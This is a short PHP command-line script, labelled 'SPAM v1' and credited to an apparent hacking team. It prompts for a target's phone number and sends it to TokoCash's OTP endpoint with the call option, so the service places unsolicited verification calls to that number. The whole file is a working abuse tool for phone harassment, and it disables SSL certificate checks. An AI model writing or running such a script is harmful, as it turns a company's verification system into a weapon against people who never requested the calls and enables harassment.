<?php function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "##################################
/ TOOLS : SPAM v1                /
/ CODED : MR.B3604               /
/ TEAM  : 407 Authentic eXploit  /
/ youtube : GUNAWAN ID           /
##################################\n\n";
echo "Limit 3x Telfon Dalam Satu Nomer\n";
echo "Masukan Nomet Target : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute; ?>
